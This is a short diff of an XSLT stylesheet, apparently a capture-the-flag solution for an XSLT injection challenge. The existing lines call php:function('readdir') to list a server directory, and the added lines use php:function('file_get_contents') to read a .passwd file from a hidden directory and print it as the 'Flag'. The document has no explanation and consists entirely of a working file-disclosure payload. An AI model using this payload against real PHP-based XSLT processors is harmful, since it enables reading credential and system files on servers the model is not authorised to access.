@@ -22,6 +22,8 @@
       <xsl:value-of select="php:function('readdir')"/><br/>
       <xsl:value-of select="php:function('readdir')"/><br/>
       <xsl:value-of select="php:function('readdir')"/><br/>
+      Flag: <br/>
+      <xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
     </span>
   </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
